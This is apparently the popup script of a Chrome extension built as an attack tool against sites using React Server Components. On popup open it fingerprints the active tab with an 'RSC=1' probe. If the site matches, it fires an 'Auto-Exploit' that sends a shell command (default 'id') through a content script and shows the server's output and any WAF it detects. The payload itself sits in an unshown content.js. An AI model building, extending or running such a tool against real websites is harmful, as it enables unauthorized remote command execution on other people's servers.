document.addEventListener('DOMContentLoaded', async () => {
    // --- UI References ---
    const ui = {
        badge: document.getElementById('status-badge'),
        tabs: document.querySelectorAll('.tab-item'),
        panels: document.querySelectorAll('.view-panel'),
        scanLog: document.getElementById('scan-log'),
        btnReProbe: document.getElementById('btn-re-probe'),
        btnExploit: document.getElementById('btn-exploit'),
        cmdInput: document.getElementById('cmd-input'),
        terminal: document.getElementById('terminal-out'),
        btnDetach: document.getElementById('btn-detach'),
        btnCopy: document.getElementById('btn-copy'),
        navBtns: document.querySelectorAll('.tab-item')
    };

    // --- State & Helpers ---
    let currentTabId = null;
    const urlParams = new URLSearchParams(window.location.search);
    const isDetached = urlParams.get('mode') === 'detached';
    const savedTabId = urlParams.get('tabId') ? parseInt(urlParams.get('tabId'), 10) : null;

    // --- Utility Functions ---
    const sleep = ms => new Promise(r => setTimeout(r, ms));

    const setStatus = (state) => {
        ui.badge.className = 'status-badge'; // reset
        const map = {
            'scanning': { class: 'scanning', text: 'SCANNING' },
            'vulnerable': { class: 'vulnerable', text: 'VULNERABLE' },
            'safe': { class: 'safe', text: 'SAFE' },
            'error': { class: 'scanning', text: 'ERROR' }, // reuse scanning style or add error style
            'ready': { class: 'safe', text: 'READY' }
        };
        const s = map[state] || map['ready'];
        ui.badge.classList.add(s.class);
        ui.badge.innerText = s.text;
    };

    const addLog = (msg, type = 'normal') => {
        const li = document.createElement('li');
        li.innerHTML = `<span class="log-icon">${type === 'danger' ? '!' : '>'}</span> <span>${msg}</span>`;
        if (type === 'danger') li.classList.add('log-item-danger');
        if (type === 'warn') li.classList.add('log-item-warn');
        if (type === 'dim') li.classList.add('log-item-dim');
        ui.scanLog.appendChild(li);
        // Auto scroll
        ui.scanLog.scrollTop = ui.scanLog.scrollHeight;
    };

    const clearLog = () => ui.scanLog.innerHTML = '';

    const switchTab = (targetId) => {
        ui.navBtns.forEach(b => {
            b.classList.toggle('active', b.getAttribute('data-target') === targetId);
        });
        ui.panels.forEach(p => {
            p.classList.toggle('active', p.id === targetId);
        });
    };

    // --- Chrome/Extension Logic ---
    
    // 1. Get Tab ID
    const getTabId = async () => {
        if (isDetached && savedTabId) return savedTabId;
        return new Promise(resolve => {
            chrome.tabs.query({ active: true, currentWindow: true }, tabs => resolve(tabs[0]?.id));
        });
    };

    // 2. Ensure Content Script
    const ensureContentScript = async (tabId) => {
        try {
            await chrome.scripting.executeScript({
                target: { tabId },
                files: ['content.js']
            });
            await sleep(100);
            return true;
        } catch (e) {
            console.error(e);
            return false;
        }
    };

    // 3. Robust Send Message
    const sendMessage = async (action, data = {}) => {
        if (!currentTabId) return { success: false, error: "No Tab ID" };
        
        const payload = { action, ...data };

        // Wrapper to handle message sending with retry logic
        const attemptSend = async () => {
             return new Promise(resolve => {
                chrome.tabs.sendMessage(currentTabId, payload, response => {
                    if (chrome.runtime.lastError) {
                        resolve({ __error: chrome.runtime.lastError.message });
                    } else {
                        resolve(response);
                    }
                });
            });
        };

        let res = await attemptSend();
        
        // If failed, try injecting script and retry
        if (res && res.__error) {
            const injected = await ensureContentScript(currentTabId);
            if (injected) {
                res = await attemptSend();
            }
        }

        return res || { success: false, error: "Timeout/No Response" };
    };

    // --- Core Logic Features ---

    const runExploit = async (cmd) => {
        ui.terminal.innerText = `[root@rsc]# ${cmd}\n> Sending payload...`;
        ui.btnExploit.disabled = true;
        
        const res = await sendMessage('run_exploit', { cmd });
        
        ui.btnExploit.disabled = false;
        
        if (res && res.success) {
            ui.terminal.innerText += `\n[+] EXPLOIT SUCCESS!\n[+] Output:\n${res.output}`;
            if (res.waf) ui.terminal.innerText += `\n[!] Warning: WAF detected (${res.waf})`;
        } else {
            const err = res.msg || res.__error || "Unknown Error";
            ui.terminal.innerText += `\n[-] FAILED: ${err}`;
            if (res && res.debug) ui.terminal.innerText += `\n[DEBUG] ${res.debug.substring(0, 100)}...`;
        }
        
        ui.terminal.scrollTop = ui.terminal.scrollHeight;
    };

    const startProbe = async () => {
        clearLog();
        setStatus('scanning');
        
        // 1. Passive Scan
        addLog('Running passive detection...', 'dim');
        const passiveRes = await sendMessage('get_passive');
        
        if (!passiveRes || passiveRes.__error) {
            addLog(`Connection failed: ${passiveRes?.__error || 'Timeout'}`, 'danger');
            setStatus('error');
            return;
        }

        if (passiveRes.isRSC) {
            addLog('Passive indicators found.', 'warn');
            passiveRes.details.forEach(d => addLog(`- ${d}`, 'dim'));
        } else {
            addLog('No passive indicators.');
        }

        // 2. Active Fingerprint (The "Probe")
        addLog('Sending Active Probe (Header: RSC=1)...', 'normal');
        await sleep(500); // UI visual delay

        const probeRes = await sendMessage('run_fingerprint');

        if (probeRes && probeRes.detected) {
            setStatus('vulnerable');
            addLog('RSC Fingerprint CONFIRMED!', 'danger');
            probeRes.details.forEach(d => addLog(`+ ${d}`, 'warn'));
            
            // 3. Auto-Exploit Decision
            addLog('Condition Met: VULNERABLE', 'danger');
            addLog('Executing Auto-Exploit...', 'danger');
            
            await sleep(800); // Visual pause before switch
            switchTab('view-exploit'); // Show the user what's happening
            runExploit(ui.cmdInput.value || 'id');
            
        } else {
            setStatus('safe');
            addLog('Probe finished. Target appears safe.', 'normal');
            if (probeRes && probeRes.__error) {
                 addLog(`Probe Error: ${probeRes.__error}`, 'dim');
            }
        }
    };

    // --- Event Listeners ---

    // Detach Window
    if (ui.btnDetach) {
        if (isDetached) ui.btnDetach.style.display = 'none';
        ui.btnDetach.addEventListener('click', async () => {
            const tabs = await chrome.tabs.query({active: true, currentWindow: true});
            const tabId = tabs[0]?.id;
            chrome.windows.create({
                url: `popup.html?mode=detached&tabId=${tabId}`,
                type: "popup",
                width: 500, height: 600
            });
            window.close();
        });
    }

    // Tabs
    ui.navBtns.forEach(btn => {
        btn.addEventListener('click', () => switchTab(btn.dataset.target));
    });

    // Re-Probe
    ui.btnReProbe.addEventListener('click', startProbe);

    // Manual Exploit
    ui.btnExploit.addEventListener('click', () => runExploit(ui.cmdInput.value));

    // Copy Button
    ui.btnCopy.addEventListener('click', () => {
        const text = ui.terminal.innerText;
        if (!text) return;
        navigator.clipboard.writeText(text).then(() => {
            ui.btnCopy.innerText = 'COPIED';
            ui.btnCopy.classList.add('copied');
            setTimeout(() => {
                ui.btnCopy.innerText = 'COPY';
                ui.btnCopy.classList.remove('copied');
            }, 2000);
        });
    });

    // --- Initialization ---
    currentTabId = await getTabId();
    if (currentTabId) {
        startProbe(); // Auto-start on popup open
    } else {
        addLog("Error: No active tab found.", "danger");
    }
});